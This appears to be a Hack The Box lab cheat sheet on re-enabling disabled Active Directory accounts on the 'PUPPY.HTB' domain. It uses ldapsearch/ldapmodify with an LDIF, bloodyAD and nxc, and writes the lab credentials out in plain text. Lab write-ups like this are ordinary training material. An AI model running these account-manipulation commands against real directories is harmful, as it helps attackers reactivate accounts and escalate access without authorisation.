# Enable `STATUS_ACCOUNT_DISABLED` users.

## ldapmodify
1. **Find the DN of the user** (Distinguished Name):
```
ldapsearch -x -H ldap://10.10.11.70 -D 'levi.james@PUPPY.HTB' -w 'KingofAkron2025!' -b "DC=PUPPY,DC=HTB" "(sAMAccountName=jamie)"

dn: CN=JAMIE WILLIAMSON,OU=Users,DC=PUPPY,DC=HTB
```
2. **Create an LDIF file** (e.g., `enable.ldif`):
```sh
dn: CN=JAMIE WILLIAMSON,OU=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 512
#512 → enabled account , 514 → disabled account
```
3. **Apply the LDIF using `ldapmodify`**:
```sh
ldapmodify -x -H ldap://10.10.11.70 -D 'levi.james@PUPPY.HTB' -w 'KingofAkron2025!' -f enable.ldif
```


## bloodyAD 
```sh
bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'PUPPY.HTB' --dc-ip 10.10.11.70 remove uac 'adam.silver' -f ACCOUNTDISABLE
```

## nxc
```sh
nxc ldap 10.10.11.70 -d PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --modify "CN=JAMIE WILLIAMSON,OU=Users,DC=PUPPY,DC=HTB" userAccountControl 512
```

---
